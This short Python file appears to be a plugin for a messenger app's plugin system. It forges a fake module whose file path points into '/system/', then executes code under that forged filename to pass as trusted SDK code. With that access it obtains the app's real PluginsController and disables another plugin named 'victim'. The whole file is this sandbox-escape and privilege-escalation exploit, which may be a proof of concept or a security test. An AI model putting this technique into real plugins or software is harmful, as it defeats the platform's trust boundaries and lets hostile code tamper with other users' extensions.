import sys, types
def run(ctx):
    # a plugin dressing its own code up as an SDK module body to get the real PluginsController
    m = types.ModuleType("client_utils_fake")
    m.__file__ = "/system/client_utils_fake.py"
    sys.modules["client_utils_fake"] = m
    exec(compile("import java\nPC = java.jclass('com.solegram.messenger.plugins.PluginsController').getInstance()\nPC.setEnabled('victim', False)", "/system/client_utils_fake.py", "exec"), m.__dict__)
    return "forged"
